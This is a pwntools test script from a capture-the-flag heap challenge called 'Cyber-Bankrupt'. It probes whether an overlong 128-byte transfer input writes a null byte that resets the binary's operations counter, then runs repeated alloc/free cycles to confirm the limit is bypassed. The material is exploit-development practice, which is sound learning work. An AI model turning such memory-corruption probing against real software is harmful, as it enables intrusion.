#!/usr/bin/env python3
"""Test: does acc[128] = 0 reset the operations counter? (counter at 0x203430)"""
from pwn import *
import sys

context.log_level = 'error'
BINDIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Medium/Cyber-Bankrupt/challenge'

def do_transfer(p, amount, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Bank ID: ', b'0')
    p.sendlineafter(b'transfer: ', str(amount).encode())
    p.sendafter(b'receiver: ', data)
    p.recvuntil(b'succeed!')

def do_free(p):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Bank ID: ', b'0')
    p.recvuntil(b'out!')

def do_view(p):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Bank ID: ', b'0')
    return p.recvline()

p = process(['./glibc/ld-linux-x86-64.so.2', '--library-path', './glibc/', './cyber_bankrupt'], cwd=BINDIR)
p.recvuntil(b'pin:')
p.sendline(b'6969')

# Count how many operations we can do.
# Each alloc+free is 2 ops. We'll try to do 10 (=20 ops, should fail at 14).
for i in range(1, 50):
    try:
        # Alloc with amount that reads up to 0x420 but send only 128 bytes
        # to trigger acc[128]=0
        data_to_send = b'A' * 128 if i == 1 else b'X'
        do_transfer(p, 0x1F1 if i == 1 else 0x20, data_to_send)
        do_free(p)
        print(f"  Cycle {i}/50: OK (2 ops)")
    except:
        print(f"  Cycle {i}/50: FAILED (ops exhausted)")
        break

print("\n--- Phase 2: Check if we can still interact ---")
try:
    do_view(p)
    print("Phase 2 view OK!")
except:
    print("Phase 2 FAILED - binary exited")

p.close()
